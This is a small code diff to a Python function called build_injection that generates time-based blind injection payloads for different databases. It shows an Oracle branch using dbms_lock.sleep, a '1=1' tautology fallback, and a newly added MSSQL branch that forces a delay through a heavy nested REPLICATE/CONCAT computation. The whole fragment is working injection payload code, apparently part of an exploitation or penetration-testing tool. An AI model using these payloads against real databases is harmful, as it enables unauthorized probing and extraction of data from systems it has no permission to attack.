@@ -38,6 +38,8 @@ def build_injection(db: str, sleep_seconds: int) -> str:
     elif db == "oracle":
         # dbms_lock.sleep(N) returns 0 on success
         expr = f"function('dbms_lock.sleep',{sleep_seconds})=0"
+    elif db == "mssql":
+        expr = f"function('DATALENGTH', function('REPLICATE', function('CONCAT', function('NEWID'), function('REPLICATE','A',4000), function('REPLICATE','B',4000), function('REPLICATE','C',4000), function('REPLICATE','D',4000)), 50000))>0"
     else:
         # Fallback: no portable sleep; use tautology so request still parses
         expr = "1=1"
